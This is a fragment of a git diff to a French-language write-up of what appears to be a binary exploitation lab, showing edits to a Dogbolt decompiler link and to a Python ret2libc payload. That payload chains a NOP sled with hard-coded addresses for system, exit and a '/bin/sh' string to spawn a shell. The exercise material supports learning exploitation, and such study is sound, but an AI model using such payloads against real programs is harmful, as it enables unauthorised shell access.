@@ -29,7 +29,8 @@ da
 da
 ```
 
-Je décide à partir de ce niveau d'utiliser les logiciels de décompilation présent sur [Dogbolt](https://dogbolt.org/?id=4128e95e-4279-47df-81a9-a69c5f209d01).
+Je décide à partir de ce niveau d'utiliser les logiciels de décompilation présent sur [Dogbolt](https://dogbolt.org/).
+
 En lui passant le binaire au préalable téléchargé, `Ghidra` me procure le code 
 suivant :
 
@@ -137,7 +138,7 @@ Je construis mon payload en utilisant python, y ajoute une lecture du `.pass` du
 
 ```python
 (python -c 'print("\x90"*80
-+ "\x08\x04\x85\x3e"[::-1] # <- return address of p
++ "\x08\x04\x85\x3e"[::-1] # <- return address of p [::-1] is an inverted splice
 + "\xb7\xe6\xb0\x60"[::-1] # <- return address of system
 + "\x08\x04\x83\xd0"[::-1] # <- return address of exit
 + "\xb7\xf8\xcc\x58"[::-1] # <- return address of "bin/sh"
